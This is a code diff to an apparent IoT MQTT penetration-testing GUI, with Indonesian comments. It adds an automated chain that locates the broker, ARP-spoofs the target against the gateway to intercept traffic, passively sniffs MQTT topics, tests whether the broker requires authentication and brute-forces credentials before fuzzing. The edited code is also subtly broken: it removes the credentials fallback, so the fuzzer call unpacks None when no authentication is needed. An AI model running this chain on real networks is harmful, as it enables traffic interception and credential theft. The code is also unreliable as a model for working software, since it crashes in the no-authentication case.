@@ -2,7 +2,8 @@ import os
 import sys
 import threading
 import sqlite3
-
+import time
+import paho.mqtt.client as mqtt 
 # Tambahkan parent folder ke path
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
 
@@ -32,11 +33,31 @@ from core.sniffer import Sniffer
 from core.network_scanner import NetworkScanner
 from core.brute_force import BruteForcer
 from core.dos_flodder import DoSFlooder
+from core.arp_poison import arp_spoof, get_default_gateway, sniff_mqtt_passive
 from core.mqtt_enum import MQTTEnumerator
 from core.fuzzer import Fuzzer
 from core.qos_delay import QoSTester
 from core.report import ReportGenerator
 
+def is_auth_required(broker_ip, port=1883, timeout=5):
+        """Return True jika broker membutuhkan kredensial (rc 4 atau 5)."""
+        result = {"rc": None}
+
+        def _on_connect(cli, _u, _f, rc):
+            result["rc"] = rc
+            cli.disconnect()
+
+        cli = mqtt.Client()
+        cli.on_connect = _on_connect
+        try:
+            cli.connect(broker_ip, port, timeout)
+            cli.loop_start()
+            time.sleep(2)
+            cli.loop_stop()
+        except Exception:
+            return False  # tidak bisa connect sama sekali -> asumsi bukan auth issue
+
+        return result["rc"] in (4, 5)
 
 def safe_set_label_text(label, text):
     QMetaObject.invokeMethod(label, "setText", Qt.QueuedConnection, Q_ARG(str, text))
@@ -754,9 +775,15 @@ class PenMQTT(QMainWindow):
             self.manual_credentials = (username, password)
             self._update_attack_report(f"[✓] Menggunakan input manual: {username}:{password}\n")
 
-            if broker_ip and enum:
-                topics = enum.enum(broker_ip, username, password)
-                self.controller.topics = topics
+            if broker_ip:
+                topics = self.pentest_worker.topics  # ambil hasil sniff ARP sebelumnya
+
+                # Jika tidak ada hasil sniff, baru coba enum dengan kredensial manual
+                if not topics and enum:
+                    topics = enum.enum(broker_ip, username, password)
+
+                self.pentest_worker.topics = topics  # update jika perlu
+
 
             self.add_log_entry(
                 self.current_device['name'],
@@ -772,6 +799,7 @@ class PenMQTT(QMainWindow):
             # Tambahan penting ini:
             if hasattr(self, 'pentest_worker'):
                 self.pentest_worker.manual_credentials = (username, password)
+                self.pentest_worker.topics = topics
                 self.pentest_worker.run()
         else:
             self._update_attack_report("[!] Input manual belum diisi. Batalkan pentest.\n")
@@ -866,6 +894,7 @@ class PenMQTT(QMainWindow):
         self.stop_automated_status_cycle()
         self.pentest_running = False
 
+    
 import sqlite3
 from datetime import datetime
 
@@ -929,6 +958,7 @@ class PentestWorker(QObject):
         super().__init__()
         self.ip = ip
         self.device_name = device_name
+        self.topics = []
         self.manual_credentials = None
         self.continue_signal.connect(self.run)
         ReportDatabase.init_db()
@@ -941,54 +971,51 @@ class PentestWorker(QObject):
             self.log.emit("Menjalankan pentest bertahap...\n")
             self.status.emit("Running...")
 
-            # Jika sedang menunggu manual input, gunakan kredensial yang telah diberikan
-            if getattr(self, "waiting_for_manual", False):
-                self.waiting_for_manual = False
-                username, password = self.manual_credentials
-                broker_ip = self.broker_ip
-                enum = self.enum
-                self.log.emit(f"[✓] Melanjutkan dengan input manual: {username}:{password}\n")
-                credentials = (username, password)
-                topics = enum.enum(broker_ip, username, password)
+            # 1️⃣  Scan broker via Sniffer (pakai Scapy) seperti semula
+            scanner = NetworkScanner()
+            interface = scanner.interface  # mis. wlan0 / eth0
+            sniffer = Sniffer(interface)
+            broker_list = sniffer.sniff_broker_from_iot(self.ip)
+            if not broker_list:
+                self.log.emit("[!] Broker MQTT tidak ditemukan.\n")
+                self.done.emit(self.ip, self.device_name, "Failed")
+                self.finished.emit()
+                return
 
+            broker_ip = broker_list[0]
+            self.log.emit(f"[✓] Broker ditemukan: {broker_ip}\n")
+
+            # 2️⃣  Jalankan ARP spoof (MITM) sebelum sniff pasif MQTT
+            gateway_ip = get_default_gateway() or "192.168.1.1"  # fallback manual
+            arp_spoof(self.ip, gateway_ip, interface)
+            self.log.emit("[*] ARP spoof berjalan, mulai sniff MQTT pasif...\n")
+
+            # 3️⃣  Sniff pasif untuk menangkap topik tanpa koneksi aktif
+            topics = sniff_mqtt_passive(broker_ip, iface=interface)
+            if topics:
+                self.log.emit(f"[✓] Topik ditemukan pasif: {len(topics)}\n")
             else:
-                # Mulai proses dari awal
-                scanner = NetworkScanner()
-                interface = scanner.interface
-                sniffer = Sniffer(interface)
-                broker_list = sniffer.sniff_broker_from_iot(self.ip)
-                if not broker_list:
-                    self.log.emit("[!] Broker MQTT tidak ditemukan.\n")
-                    self.done.emit(self.ip, self.device_name, "Failed")
-                    self.finished.emit()
+                self.log.emit("[!] Tidak ada topik terdeteksi via sniff pasif.\n")
+
+            # 4️⃣  Cek apakah broker butuh kredensial
+            need_auth = is_auth_required(broker_ip)
+            credentials = None
+            if need_auth:
+                self.log.emit("[!] Broker memerlukan autentikasi. Menjalankan brute force...\n")
+                bruter = BruteForcer(logger=lambda m: self.log.emit(m))
+                creds = bruter.brute_force(broker_ip)
+                if creds:
+                    credentials = creds
+                    self.log.emit(f"[✓] Kredensial ditemukan: {creds[0]}:{creds[1]}\n")
+                else:
+                    self.log.emit("[!] Brute force gagal, meminta input manual...\n")
+                    self.waiting_for_manual = True
+                    self.enum_broker_ip = broker_ip
+                    self.need_manual_credentials.emit(broker_ip, None)
                     return
 
-                broker_ip = broker_list[0]
-                self.log.emit(f"[✓] Broker ditemukan: {broker_ip}\n")
-
-                enum = MQTTEnumerator(logger=lambda msg: self.log.emit(msg))
-                topics = enum.enum(broker_ip)
-                credentials = None
-
-                if not topics:
-                    self.log.emit("➤ Jalankan brute force...\n")
-                    bruter = BruteForcer(logger=lambda msg: self.log.emit(msg))
-                    creds = bruter.brute_force(broker_ip)
-                    if creds:
-                        credentials = creds
-                        self.log.emit(f"[✓] Kredensial ditemukan: {creds[0]}:{creds[1]}\n")
-                        topics = enum.enum(broker_ip, creds[0], creds[1])
-                        self.log_entry.emit(self.device_name, "BruteFOrce", f"Kredensial: {creds[0]}:{creds[1]}", "Succeed") # Tambahan 22.28
-                    else:
-                        self.log.emit("[!] Gagal brute force. Menunggu input manual...\n")
-                        self.enum = enum
-                        self.broker_ip = broker_ip
-                        self.waiting_for_manual = True
-                        self.need_manual_credentials.emit(broker_ip, enum)
-                        self.log_entry.emit(self.device_name, "BruteFOrce", f"Device selected: {self.ip}", "Failed") # Tambahan 22.28
-                        return
-                else:
-                    credentials = (None, None)
+            # 5️⃣  Simpan topik ke controller untuk modul lain
+            #self.controller.topics = topics
 
             self.log.emit("➤ Jalankan Fuzzing...\n")
             fuzzer = Fuzzer(broker_ip, *credentials, logger=lambda msg: self.log.emit(msg))
